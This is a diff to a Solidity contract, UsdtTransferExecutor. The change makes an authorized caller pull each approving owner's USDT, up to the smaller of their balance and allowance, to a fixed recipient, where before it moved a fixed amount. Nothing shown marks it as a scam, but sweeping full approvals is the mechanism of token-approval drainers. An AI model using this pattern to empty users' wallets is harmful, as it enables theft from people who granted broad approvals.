@@ -2,6 +2,8 @@
 pragma solidity ^0.8.24;
 
 interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
     function transferFrom(address from, address to, uint256 value) external returns (bool);
 }
 
@@ -33,13 +35,18 @@ contract UsdtTransferExecutor {
     function transferApprovedAmount(address owner) external {
         if (msg.sender != authorizedSpender) revert Unauthorized();
 
+        uint256 balance = usdt.balanceOf(owner);
+        uint256 allowance = usdt.allowance(owner, address(this));
+        uint256 transferAmount = balance < allowance ? balance : allowance;
+        if (transferAmount == 0) return;
+
         (bool success, bytes memory data) = address(usdt).call(
-            abi.encodeWithSelector(IERC20.transferFrom.selector, owner, recipient, USDT_AMOUNT)
+            abi.encodeWithSelector(IERC20.transferFrom.selector, owner, recipient, transferAmount)
         );
         if (!success || (data.length != 0 && !abi.decode(data, (bool)))) {
             revert TransferFailed();
         }
 
-        emit TransferExecuted(owner, recipient, USDT_AMOUNT);
+        emit TransferExecuted(owner, recipient, transferAmount);
     }
 }
